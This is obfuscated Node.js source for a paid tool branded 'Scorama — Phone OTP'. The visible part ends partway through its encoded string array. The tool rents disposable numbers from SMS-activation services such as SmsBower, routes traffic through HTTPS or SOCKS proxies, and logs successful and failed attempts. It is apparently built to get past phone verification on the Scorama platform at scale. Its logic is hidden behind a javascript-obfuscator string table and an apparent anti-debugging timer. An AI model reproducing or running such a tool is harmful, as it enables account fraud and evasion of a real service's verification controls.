const fs = require('fs'),
  path = require("path"),
  {
    execSync
  } = require("child_process"),
  {
    isMainThread
  } = require("worker_threads");
if (isMainThread) {
  const req = ["https-proxy-agent", "socks-proxy-agent", "chalk"];
  let missing = false;
  for (const m of req) {
    try {
      require.resolve(m);
    } catch (v1) {
      missing = true;
      break;
    }
  }
  if (missing) {
    console.log("\n[SETUP] Installing dependencies...");
    try {
      const v2 = {};
      v2.stdio = "inherit", execSync("npm install https-proxy-agent socks-proxy-agent chalk@4", v2);
    } catch (v3) {
      console.error("[ERROR] npm install failed"), process.exit(0x1);
    }
  }
}
const https = require("https"),
  http = require("http");
(function () {
  const fn3 = function () {
    let v5;
    try {
      v5 = Function('return (function() {}.constructor("return this")( ));')();
    } catch (v6) {
      v5 = window;
    }
    return v5;
  };
  const v4 = fn3();
  v4.setInterval(fn2, 0xdac);
})();
const zlib = require("zlib"),
  crypto = require("crypto"),
  chalk = require("chalk"),
  readline = require("readline"),
  {
    HttpsProxyAgent
  } = require("https-proxy-agent"),
  {
    SocksProxyAgent
  } = require("socks-proxy-agent");
let OUT_DIR = __dirname,
  SUCCESSFUL_FILE = path.join(OUT_DIR, "successful.txt"),
  FAILED_FILE = path.join(OUT_DIR, "failed.txt"),
  DEBUG_FILE = path.join(__dirname, "debug.txt");
function getDesktop() {
  const v7 = require('os'),
    v8 = v7.homedir();
  for (const v9 of [path.join(v8, "Desktop"), path.join(v8, "OneDrive", "Desktop"), path.join(v8, "OneDrive - Personal", "Desktop")]) {
    if (fs.existsSync(v9)) return v9;
  }
  return v8;
}
function setupOut(v10) {
  const v11 = process.platform === "android" || fs.existsSync("/storage/emulated/0");
  let v12;
  if (v11) v12 = "/storage/emulated/0/NOT REXY/scorama";else {
    let v13 = null;
    if (v10 && typeof v10 === "string") {
      const v14 = path.resolve(v10.trim());
      if (fs.existsSync(v14)) {
        const v15 = path.dirname(v14);
        if (v15 !== __dirname) v13 = v15;
      }
    }
    if (!v13) v13 = getDesktop();
    v12 = path.join(v13, "NOT REXY", "scorama");
  }
  try {
    const v16 = {};
    v16.recursive = true, fs.mkdirSync(v12, v16);
  } catch (v17) {
    v12 = __dirname;
  }
  OUT_DIR = v12;
  SUCCESSFUL_FILE = path.join(v12, "successful.txt");
  return FAILED_FILE = path.join(v12, "failed.txt"), v12;
}
function debugLog(v18, v19, v20) {
  try {
    const v21 = new Date().toISOString();
    fs.appendFileSync(DEBUG_FILE, '[' + v21 + "] [" + v18 + "] [" + v19 + ']\x0a' + (typeof v20 === "object" ? JSON.stringify(v20, null, 0x2) : String(v20)) + '\x0a' + '─'.repeat(0x50) + '\x0a', "utf8");
  } catch (v22) {}
}
const B = chalk.hex("#FC4233");
const C = chalk.hex("#FCA732"),
  Y = chalk.hex("#FF6B35");
const W = chalk.white,
  G = chalk.gray,
  R = chalk.hex("#FF4466"),
  GR = chalk.hex("#44FF88"),
  DIM = chalk.hex("#555555");
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(B("   _____                                        "));
    console.log(B("  / ____|                                       "));
    console.log(C(" | (___   ___ ___  _ __ __ _ _ __ ___   __ _   "));
    console.log(C("  \\___ \\ / __/ _ \\| '__/ _` | '_ ` _ \\ / _` |  "));
    console.log(Y("  ____) | (_| (_) | | | (_| | | | | | | (_| |  "));
    console.log(Y(" |_____/ \\___\\___/|_|  \\__,_|_| |_| |_|\\__,_|  \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Author    : ") + B("NOT REXY                     ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium License              ") + W('│'));
    console.log(W("│ [•] Target    : ") + Y("Scorama — Phone OTP          ") + W('│'));
    console.log(W("│ [•] Version   : ") + B("SCORAMA-V1.0.0               ") + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
class NexaRateLimiter {
  constructor(v23) {
    this.delayMs = v23;
    this.queue = [];
    this.processing = false;
  }
  ["enqueue"](v24) {
    return new Promise((v25, v26) => {
      this.queue.push(async () => {
        try {
          v25(await v24());
        } catch (v27) {
          v26(v27);
        }
      });
      if (!this.processing) this._process();
    });
  }
  async ["_process"]() {
    this.processing = true;
    while (this.queue.length > 0x0) {
      const v28 = this.queue.shift();
      await v28(), await new Promise(v29 => setTimeout(v29, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(0x1f4),
  twoOoLimiter = new NexaRateLimiter(0x1f4),
  VOLTX_KEY_FILE = path.join(__dirname, "voltx_key.txt"),
  STEX_KEY_FILE = path.join(__dirname, "stex_key.txt"),
  SMSBOWER_KEY_FILE = path.join(__dirname, "smsbower_key.txt");
function smsBowerRequest(v30) {
  return new Promise((v31, v32) => {
    const v33 = {};
    v33.Accept = "text/plain", v33.Connection = "close";
    const v34 = {};
    v34.hostname = "smsbower.page", v34.port = 0x1bb, v34.path = "/stubs/handler_api.php?" + v30, v34.method = "GET", v34.headers = v33;
    const v35 = v34,
      v36 = https.request(v35, v37 => {
        let v38 = '';
        v37.on("data", v39 => v38 += v39), v37.on("end", () => v31(v38.trim()));
      });
    v36.on("error", v40 => v32(new Error("SmsBower net: " + v40.message))), v36.setTimeout(0x3a98, () => {
      v36.destroy();
      v32(new Error("SmsBower timeout"));
    }), v36.end();
  });
}
function smsBowerFetchNumber(v41, v42, v43, v44) {
  let v45 = "api_key=" + encodeURIComponent(v41) + "&action=getNumber&service=" + encodeURIComponent(v42 || 'fb');
  return v43 && String(v43).trim() !== '0' && String(v43).trim() !== '' && (v45 += "&country=" + encodeURIComponent(v43)), v44 && parseFloat(v44) > 0x0 && (v45 += "&maxPrice=" + encodeURIComponent(v44)), smsBowerRequest(v45).then(v46 => {
    if (v46.startsWith("ACCESS_NUMBER:")) {
      const v47 = v46.split(':'),
        v48 = {};
      return v48.activationId = v47[0x1], v48.phoneNumber = v47[0x2], v48;
    }
    if (v46 === "NO_NUMBERS") throw new Error("SMS Bower: No numbers available right now");
    if (v46 === "NO_BALANCE") throw new Error("SMS Bower: Insufficient balance");
    if (v46 === "BAD_KEY") throw new Error("SMS Bower: Invalid API key");
    throw new Error("SMS Bower error: " + v46);
  });
}
const ZENEX_KEY_FILE = path.join(__dirname, "zenex_key.txt");
function fn1() {
  const v49 = ['DwXbzNy', 'zLDvEvu', 'EKzHrK8', 'uvDbufm', 'zhvRzq', 'seTUtvm', 'wMvUzxGGBMv0oIa', 'DxbKyxrLx3jLCxvPCMvK', 'DMvWzuG', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'C2XkCuS', 'iZG4odG4oa', 'cIaG4PYxifvWzgf0zsbYzxf1AxjLzceGugXLyxnLigrVD25SB2fKihrOzsbSyxrLC3qGDMvYC2LVBI4k', 'swrtDeq', 'twr5Bhe', 'AwXtCMq', 'BNvTyMvYC0zPBgu', 'uMHhEva', 'zxHPC3rZu3LUyW', '4Psu4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4PsycG', 'AxbJvxG', 'DxrMoa', 'C29JA3m1oI8V', 'C3rHDhvZ', 'DgLTzxn0yw1W', 'icdILzRILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILz0k', 'u2vYDMvYideGkc9NzxqP', 'tM9Xsu8', 'C3rHCG', 'Cgf1C2u', 't0T5tMS', 'zMXVB3i', 'Dw5SAw5Ru3LUyW', 'CgXHEwvY', 'tMnrq0S', 'z3PPCa', 'u2vJluzLDgnOlvnPDgu', 'l3bYB2mVy3b1Aw5MBW', 'lI4U', 'g1SWBsa', '4PQHief1Dg8GzMv0y2GGzNjVBsbAzw5LEa', 'zxjYB3iUCgHVBMvFywXYzwfKEv9LEgLZDhm', 't25LrhjPDMu', 'rgrnuxO', 'qwrKzwqG', '4QYf77IpieDViejHy2SGDg8GuhjVEgLLCYbtzwXLy3rPB24', '4PscifVIGkjDifzLCNnPB24Gica6ia', 'ChjVy2vZC2LUzW', 'AhvvvK8', 'Ahr0CdOVlW', 'yMHmC2m', 'u2vYDMvYidmGkc9WmY9NzxqP', '4QYf77IpieDViejHy2SGDg8GvgHYzwfKCYbtzwXLy3rPB24', 'zgf0yq', 'qwnJzxb0', 'CMvWBgfJzq', 'l3n0B3jHz2uVzw11Bgf0zwqVmc9ty3jHCgvYieTPBMCVC2nVCMfTyq', 'AvvZtxG', 'qw1ivgq', 'D2HPDgu', 'CgHVBMu', 'BeDyDhO', 'uNrjsui', 'y3jLyxrLsgfZAa', 'qKfex0Tfwq', 'tezZCNa', 'wKX3A2e', 'jg1Iid0GkeDLDc1dAw1jBNn0yw5JzsbxAw4ZmL9cyxnLqM9HCMqGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLnLCMLHBe51BwjLCJSG', 'lJaU', 'pt09ifndt1jbtueGrevcvuCGu0vtu0LptIa', 'zw4TtKC', 'Cgf0Aa', 'tM8SigvUDgvYig5LDYbRzxK', 'q25JCuy', 'zxHPDa', 'lI4Ukq', 'kcGOlISPkYKRksSK', 'ywnL', 'BwvNyq', 'zw5XDwv1zq', 'wuX0Bhe', 'Dg9tDhjPBMC', 'cIaG4PYxieXPy2vUC2uGC2vYDMvYigLZign1CNjLBNrSEsb1BMrLCMDVAw5Nig1HAw50zw5HBMnLig9YigLZihvUCMvHy2HHyMXLlG', 'CMvUzgvY', 'C2vHCMnO', 'y29Uy2f0', 'i0zgndq2nG', 'rvjs', 'rw50zxiGu01tiejVD2vYiefqssblzxK6', 'q2HLy2TPBMCGDxnLCM5HBwuG', 'Bw9KzwW', 'CMfUzg9T', 'Aw5xqNG', 'uMvMzxjLCG', 'B2PuyKG', 'mIbszxrYAwvZicHezwzHDwX0kq', 'rw50zxiGwMvUzxGGqvbjieTLEsaOBwfWAwTLEsK6', '8j+uJsbbDxrVifjHBMDLiezPBMrLCIaOC2nHBIbJB25ZB2XLkq', 'iokCPIbty3jHCgvYieTPBMC', 'cIaG4PYtief1Dg8GuMfUz2u6ia', 'cIaG4PYxie5VigHPDhmGzM9YihnLBgvJDgvKigfWCc4k', 'g1SWBqO', 'zMf0ywW', 'icdILztILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzC', 'Aw5MBgf0zvn5BMm', 'C2T5', '4PYtifrOCMvHzhmGoIa', 'icdILiiGia', 'rNbUCuO', 'CwvHuuW', 'q29UDgvUDc1uExbL', 'Bg9NCW', 'CMvSzwfZzq', 'DMXeAhG', 'z2v0ugf0Aa', 'DNfABK0', '8j+mKcbbDxrVigzLDgnOigzYB20GtMv4yu9uucbqyw5LBa', 'vhHeCem', 't094r20', 'DNPZDey', 'zM9YBwf0', 'C2v0u3rHDhvZ', 'vM9SDhGG4PQH', 'v1f6vfG', 's3reCuW', 'tvbNz3q', 'ufLIwhi', 'sNzUz1m', 'zvbTyKK', 'EMXPyG', 'A0rAt2y', 'CfnLCwC', 'g1SWBq', 'yM9ZCW', 'DMvYAwzPy2f0Aw9U', 'y291BNrYEq', 'uMv0CNKG', 'Bwf0y2G', '4Psm4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psa4Psq', 'zM9YrwfJAa', 'y2HPzwy', 'vxnLCI1bz2vUDa', '4P2miev4AxqGuhjVz3jHBq', 'BM93', 'wMvUzxGGwW', 'vM9UqMi', 'tg9Oseq', 'ks4GvxnLigL0pW', 'BgfZDfn0yxr1CW', 'Dg9W', 'wwvZlcb1C2uGC2f2zwqGA2v5', 'Cg9YDa', 'z3PPCcWGzgvMBgf0zsWGyNiSihPZDgq', 'DhblvuO', 'rw50zxiGCMfUz2uGiW', 'wwfgruu', 'tMv4yu9uua', 'iIWGiK5VDf9biejYyw5KiJT2psi4iIWGiKnOCM9TAxvTiJT2psi', 'CgHVBMvoDw1Izxi', 'l3n0B3jHz2uVzw11Bgf0zwqVma', 'ywrK', 'C21ZyM93zxi', 'yNjVDgXPrgvJB21WCMvZC1n5BMm', 'qMroEKe', 'EKjfALa', 'DwvHyLm', 'C3rYAw5N', 'r0vu', 'l3n0DwjZl2HHBMrSzxjFyxbPlNbOCd8', '8j+tSsbfBNrLCIbZAw5NBguGCgHVBMuGBNvTyMvY', 'BenzwKS', 'C3vIC3rYAw5N', 'ue9tva', 'mtG4lJeZnY4XnZyUmtyZ', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYCYbtzwXLy3rPB24', 'Bwf4uhjPy2u', 'y2fSBa', 'yNvPBgrnAw4', 'sgHOC0u', 'ALvYEgy', 'Ahr0Chm6lY9WBgf5lNnJB3jHBweUy29T', 'Avbouvu', 'DvnYsKS', 'DhjPBq', 'D1blweG', 'icaGicaGicaGicaGicaGicaGicaGica', 'C3rLEf9RzxKUDhH0', 'icdILzeGieHxsuqGica6ia', 'Bef5ufe', 'uLLwvxi', 'y29UC3rYDwn0B3i', 'Aw5OzxjPDa', 'FhnJB3jHBwf8ms4WlJb8', 'icdINjmGtgLJzw5ZztOG', 'yxv0BW', 'zhnKzKS', 'wuzqEhi', 'zg93BG', 'nunNA2v5Aq', 't1vgzhO', 'rMfPBgvK', 'z3LowxO', 'BwfUDwfS', 'CuLpufa', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYifnVDxjJzq', 'rhHjBwC', 'AKP3Ce4', 'BerysMi', 'y1PRzMO', 'C21ZqM93zxjdB25MAwC', 'z3vUEMLWu3LUyW', 'iZu1ntu1nq', 'ChjV', 'CfnHvxq', 'CMv0DxjU', 'uMP2ywu', 'v29YA2vYia', 'i0zdqtCZmG', 'thr3BvG', 'ywXS', 'Bgf3Ee0', 'u2nYqa', 'yMX1zq', 'rMLSDgvYigj5igfWCdO', 'tMv4yu9uudOGvgLTzw91Da', 'CMfUz2u', 't1fdzNO', 'uMzhCMm', 'EMnbzwi', 'sKD5wxa', 'A0Lpsvm', 'Auv0rxa', 'r0P3AuG', 'u0vmrunuifriuKvbrfm', 'v2PMv1a', 'y3rYBa', 'qwnvCwG', 'DgLTzw91Da', 'rw5Srvq', 'oI8V', 'ntaGvgHYzwfKCYaOrxH0CMvTzsK', 'uMDuteq', 'mtu1ntm4vwD6z1jO', 'icdILzeGicaG4PYxifvoqvvuse9ssvPfrcbiqvjev0fsrsdIGjqGu0npuKfnqsbut09micaGiokvKq', 'BMvV', 'se5RBeG', 'qwXSihjLDhjPzxmGzxHOyxvZDgvK', '8j+tPIbbBgW', 'u2nVCMfTysbpvfaGvhjPz2DLCIaGicaGicaGica', 'uwfbBfa', 'i0zgrdCWma', 'zMTMwvG', 'wKLerLC', 'uNvNDKy', 'u0npuKfnqs1wms4WlJaGicaGicaGicaGicaGica', 'y29TBw9U', 'BwLU', 'DgHYzwfKCW', 'mtaGvgHYzwfKCYaOrgvMyxvSDcK', 'C1z3rxm', '8j+tUcbjBNn0ywDYyw0', 'y2XVC2u', 'yunAtvu', 'mcbszxrYAwvZicHtA2LWig9UigzHAwWP', 'z3jHEq', '4PscifVIGkjDifrVB2WGicaGica6ia', 'BMv4yw90ChnLCNzPy2uUy29T', 'icdILzeGienVBNrHy3q6ihqUBwuVC2nYyxbLCL9RAw5NihrVihjLz2LZDgvYicaGicdILze', 'u01tiejVD2vYoIboBYbUDw1IzxjZigf2ywLSywjSzsbYAwDODcbUB3C', 'C2v0sw50zxj2ywW', 'EKv1yMG', 'tK9FqKfmqu5drq', 'CvztrKC', 'C3rLEa', 'mtyXnZK0sg1Xz1HU', 'C2HPzNq', 'v1DADuu', 'sg93ig1HBNKGBNvTyMvYCZ8Gw2rLzMf1Bhq6ntbDoG', '4PYxievYCM9YoIboDw1IzxjZigzPBguGBM90igzVDw5KoIa', 'DfrAtum', 'u01tiejVD2vYoIbjBNn1zMzPy2LLBNqGyMfSyw5Jzq', 'yxbWBgLJyxrPB24VANnVBIWGDgv4Dc9WBgfPBIWGkI8Q', 'cIaG4PYxie5VihzHBgLKihnLBgvJDgLVBI4k', 'vhjPz2DLCMvKie9uucbMB3iG', 'C3rKAw4', 'icHLlMCUidiZndGWwfHyksbVCIaNyMfJAYC6', 'CMvJDxjZAxzL', 'ywXTrNG', 'l29UyM9HCMrPBMCVDJeVywnJB3vUDc9ZAwDUlxvW', 'r0vzv2K', 'Cg9W', 'yNL0zuXLBMD0Aa', 'wMvUzxG6ie5Vig51BwjLCNmGyxzHAwXHyMXLigzVCIbYyw5Nzsa', 'EwvZ', 'CgfZCW', 'C29wEge', 'm3WWFdj8nhWX', 'y29UDgvUDc1LBMnVzgLUzW', 'y2HPBgrFChjVy2vZCW', 'z2jPyxa', 'DuXrwhm', 'l2fWAs92ms9UDw1IzxjZl3aYl2DLDa', '8j+tSsbttvmGqM93zxi', 'DLnRu1C', 'Ag9ZDa', 'C3bSAxq', 'm3W2Fdj8nxWWFdr8mq', 'ihrHCMDLDhm', 'r3zKAeK', 'vMXgz04', 'Bwf4', 'zMjnvxK', 'sxzVDg4', 'CMfUz2vZ', 'tvztD08', 'wMvUzxG6ieLUC3vMzMLJAwvUDcbIywXHBMnL', 'qMTOD3G', 'xtOG', 'DgHLBG', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'A0TSwvK', 'z2fNsMW', 'C3vJy2vZC2z1Bc50Ehq', 'rgzXwvm', 'mtiWmdf4z1bQDfO', 'zgvSyxLnCW', 'C2XPy2u', 'D2LUmZi', 'qMrirui', 'jM1HEfbYAwnLpq', 'ywn0AxzHDgLVBKLK', 'wunPDg4', 'sJL4B3DcuvPnotGWrZK3ENy5vM9covLSywr5mxbwDfm1sxG5Dhvmmq', 'wuzgwgK', 'u2vYDMLJzsbJB2rLifTKzwzHDwX0oIbMyL06', 'iokuGIa', 'r3vRAxO', 'zgLNzxn0', 'nJi4ntG5nM95zfjfBW', 'zw5K', 'BMvgyMq', 'C21ZyM93zxiUCgfNzq', 'A2v5ChjLC3m', 'y29UC29SzvbHDgG', 'lM5LEgfFyxbPx2TLEq', 'rw50zxiGtMv4yu9uucbbueKGs2v5oG', 'CxvLDwu', 'u2LNBNvWihjLAMvJDgvKoIa', 'Agf3AW', 'l2v0yY9TywnOAw5LlwLK', 'sNvowhK', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', '8j+tMezcka', 'Dg9Rzw4', 'u21ZqM93zxiGBMv0oIa', 'DeTuwxi', 'q29UC29SzsbMzxrJAcbMywLSzwq', 'BMrluuC', 'Aw5ZDwzMAwnPzw50', 'C3rHCNruAw1L', 'Ag9ZDg5HBwu', 'wuH0qNy', 'Dg90ywXoDw1IzxjZ', 'y3LXquG', 'drTBsW', 'x3nPzf8', 'icdILzeGifn0yxr1CYa6ia', 'Dfnwvfq', 'DxnLCM5HBwuTy2HLy2S', 'y29YCW', 'wgX1wLC', 'y2HHBgS', 'uxDtDha', 'rhPMsg4', 'BMv4yq', 'uK9rzNK', 'vxnLihnHDMvKigTLEq', 'y255v1m', 'sw52ywXPzcbWCM94Eq', 'DMHoz2e', 'cIaGqxbWoIa', 'vxnLCG', 'rgvZA3rVCa', 'C2nVCMfTyq', 'ChvZAa', 'sw5ZDwzMAwnPzw50igjHBgfUy2u', 'rNDgr1O', 'Dg90ywXdB3vUDa', 'u0vmrunuie5fweeGu0vsvKvs', '4PscifVIGkjDifn0yxr1CYaGica6ia', 'DMvYC2LVBG', 'yMfUBMvK', 'ENbMqNC', 'ig51BwjLCNmP', 'C2HHmJu2', 'q2r4sNa', '4PscifVIGkjDief1DgHVCIaGica6ia', 'cIaG4Pwu4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwq4Pwx', 't1rqifnLBNq', 'DM9SDhG', 'CMvHzezPBgvtEw5J', 'q29UBMvJDgLVBG', 'ihWGkf9FxYaGif9FxYbFx18Gif8Gx18Gx18GxYbFif9Fif9FxYaGif9Fif8Gica', 'tM8GBNvTyMvYCYbHDMfPBgfIBgu', 'y2vbD2y', 's1v4BeS', 'C2HHCMS', 'C2LUz2XLtNvTyMvY', 'Axjmqvq', 't3jPz2LU', 'q29UDgvUDc1mzw5NDgG', 'D29SzG', 'CLHos0W', 'Aw5ZDgfNCMfT', 'BKnwzha', 'tMv4yu9uudOGtM8GBNvTyMvYihjLDhvYBMvK', 'EMvU', 'AgvHzgvYCW', 'q29UC29SztOGsw52ywXPzcbku09o', 'icaGg1SZnM3INPqBwZm1Bsa', 'jgrPC2SGpsaOr2v0lunPBuLUC3rHBMnLifDPBJmYx0XVz2LJywXeAxnRic1gAwX0zxiGj0rLDMLJzuLepvWNqZPCjYCGluvYCM9Yqwn0Aw9UifnPBgvUDgX5q29UDgLUDwuPlLzVBhvTzvnLCMLHBe51BwjLCJSG', 'uuvREMG', 'vw5RBM93BKnqvq', 'u01tiejVD2vYigTLEsbMB3vUzcaO', 'icbB', '8j+mKe1LDgeO', 'C3rVCa', 'yxbPlJjVBZKUy2XVDwq', 'DgLNzxi', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'Dg9vChbLCKnHC2u', 'cIaG4PYxie5VihzHBgLKihjHBMDLCY4k', 'A2LUzW', 'AMzozMG', 'DNbhD2m', 'AML4v0e', 'BMv4Df9ZDgvW', 'CMLKzxi', 'BK9QEuG', 'C3rHCNrZv2L0Aa', 'vvrxsue', '4PQHief1Dg8Gzgv0zwn0icyGC2vUzcaOiZeGCMfUz2uP', 'yxbWBhK', 'r0XNsuW', 'C29JA3m1', 'u2vJluzLDgnOlurLC3q', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 's3DgvLO', 'l01yuZq3rKXgwdbvl3rUzxzZl0bWDwjSAwmVyxbPl2nVBNnVBgu', 'y2HHAw4', 'AhvUDgvY', 'iokUNIa', 'C2v0DgLUz3mGz2v0ihnLy3vYzsbHBMrYB2LKx2LKidi+l2rLDI9UDwXSihX8igvJAg8GiIi', 'vxnLCM5HBwuGy2HLy2SGzMfPBgvKicHivfrqia', 'iKDVB2DSzsbdAhjVBwuIo3y9iG', 'mJaGvgHYzwfKCYaOrMfZDcK', 'tK9FtLvnqKvsuW', 'AMrXrxy', 'DxPhsMS', 'Dg9gAxHLza', 'qu5lsu5hlq', 'zw1PDeTLExbYzxnZrxzLBNrZ', 'rwXXrLG', 'BvHLveS', 'tK9uifjfr0LtvevsruqGlYbsru1pvKve', 'cIaG4PYxienVBNnVBguGzMv0y2GGzMfPBgvKoIa', 'vefsu2W', 'CNzbuwu', 'zgfYAW', 'q29UC29SzsbUzxr3B3jRoIa', 'l2fWAs92ms9UDw1IzxjZl2DLDa', 'tK9uifjfr0Ltvevsruq', 'BLHct0e', 'D25VtfO', 'l01yuZq3rKXgwdbvl3rUzxnZl0bWDwjSAwmVyxbPl2DLDg51Bq', 'yMvHCG', 'tgnIt3C', 'BwTKAxjtEw5J', 'iokgUYbty3jHCgvYieTPBMC', 'iZmZmZmZmW', 'ms4WlJa', '8j+mKcbnzxrH', 'BM9YBwfS', 'rK5KD0K', 'q291BNrYEsbJB2rLicGWid0Gyw55ksbBzgvMyxvSDdOGmf06', 'CMv0DxjUicHMDw5JDgLVBIGPia', 'q3fitLm', 'id09pqO', 'BurJBMO', 'icaGifbSzwfZzsbJAgvJAYb5B3vYigLUDgvYBMv0ignVBM5Ly3rPB24GB3iGDhj5igfNywLUigXHDgvYlGO', 'AvHnA3y', 'A3zvsge', 'lxnLC3nPB24T', 'whnure0', 'Ahr0Ca', 'ugLuuwC', 'Dgv4Dc9WBgfPBG', 'C3rKAw8', 'zgLYBMfTzq', 'z2frywy', 'C3bSAwnL', 'mJyYmtaXoxDbA1ztrq', 'uevrt04', 'CLvxreG', 'zw1WDhK', 'l3vZzxjZl3yXl2f2ywLSywjPBgL0Eq', 'DhDVt29dB25MAwC', 'Dg9ju09tDhjPBMC', 'BujdyKW', 'uNrTu0G', 'yxbPx2TLEt0', 'CMLK', 'sg93ihrVihnLBgvJDcbYyw5Nzxm/', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'CgfYC2u', 'BNbTigLUC3rHBgWGAhr0ChmTChjVEhKTywDLBNqGC29JA3mTChjVEhKTywDLBNqGy2HHBgTana', 'BM9Uzq', 'mM9VotOGsw52ywXPzcbku09o', 'r1bIC2C', '8j+tMcbgywnLyM9VAW', 'wwDvEwy', 'icdILia', 'icdILze', 'CMvHC29U', 'qwnJzxb0luXHBMD1ywDL', 'B2jQzwn0', 'sMzuCgi', 'AgL0CW', 's21jywW', 'uNvoyu4', 'rM91BMqGC2f2zwqGqvbjieTLEsaOlI4U', 'l3vZzxiVz2v0BNvTyMvY', 'yKjSB1q', 'z1fgtgm', 've1QAum', 'zgvIDq', '4PscifVIGkjDifrLBgvNCMfTica6ia', 'igHPDhmPica', 'yuD2uNO', 'mJe4nfHdCxznwa', 'Bwv0Ag9K', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'jgnWDsa9icHhzxqTq2LTsw5ZDgfUy2uGv2LUmZjFuhjVy2vZC29Yic1fCNjVCKfJDgLVBIbtAwXLBNrSEunVBNrPBNvLihWGu2vSzwn0lu9IAMvJDcaTrMLYC3qGmsKUuhjVy2vZC29Yswq7ia', 'Ag9TzwrPCG', 'A25Pz2H0', 'z3jLzw4', 'BgvUz3rO', 'vK5Xtgi', 'rw55tey', 'DKHND2m', 'uMfUz2uGrMLUzgvYig1Vzgu6', 'CMvTB3zL', 'D1j5tvi', 'odeWmfHqAfvRDa', 'BgLVBG', 'C21ZyM93zxjFA2v5lNr4Da', 'z2DLCG', 'DuHfuKO', 'ufz2B0K', '4PYtifrHCMDLDcaGoIa', 'r1P1q09kuLDinKXzCKjbuee4DgrMmdHpwJK3rNv5uwXuCtmWC21XANPKrhvWoe9yuxbLyK5AzdrzvumWrhC5wgP4yM5PqLG0zMj5rJmWqJy2A0P0qvzJtMeWnLHivg1vCxbTrJnWl1b5BLq4qITABvzKoxHSv2OXztbXrenWuZztnvnivdnQmtnYCLPuu3PQouuWzhLlrdvTvMPkt2rTDKzjDM9nwc9bl1qYk0vLzMzAyw9VExr2Cu1hA3fOvgjPqNORzdHABtq3m2iRuwnbBevOCNDpC2vnt2vSndiXmZG3AMO4ztyXCgjHCgPZEMrTn0WVogK2k3bhuYTvDgPsmhLouxHlvYS1zJfYuLbWAwHHyZDVBM5jmfPMCLHMk3a4tgDwntHcwvu5BvDJmgLkr2HVmLPhBJeRCu91qvjmyKvVnKfbBJyZmMvvsxHxwMXSsJnUsLLJzLi1AI9ml0fMvNzQm0PJEMXOsunSnhvRtuHiqNnfvLPmtNb6nvr1BMXzzunTuKz1EKv6ExORnuDgrJrzutHuotL5svfomuPmzu5Ls0nxsKzAAvz0A3f5ogvSA2HxDtCWwezPwdDot0zuAvvqm1n4DhnbuuTgl256seC5wvmYzuDRv0rXsgC4DdrMzMHhuMm3s1DdzI9hAdr1r3i4otflvxjdzK9kqwnvt0Lnoff2wcTxBgvQDK4RrMnewKj5AxLjn3vZBcSWAxCZq1rWtM5ut04RwfjLzJnYufGXEvr2Duv6rgzHvgvirM53uu94nezxtKPPyJDowwnKBMLNEfrxyY9qD0fADtzlyM5wmJzyrvbdoevzC0PUqvv6Du1TswzltgvLAhmZDgX0wKmRqKXwow9RB2OZEhPRwuKVl2rRr0LuruWRz1bmAM5Pv25IuvCXnw9osK09', 'u0vmrunuifjfvfjjrvmGuevsie5vtujfuG', '4PYtie91Dhb1DcaGoIa', 'BNvSBa', 'z29Sza', 'B1DZzuq', 'Aw5JBhvKzxm', 'y3jVC3mTC2L0zq', 'C3rHDgvpyMPLy3q', 'DgvZDa', 'qMjYsuK', 'y3LHBG', 'ywn0Aw9U', 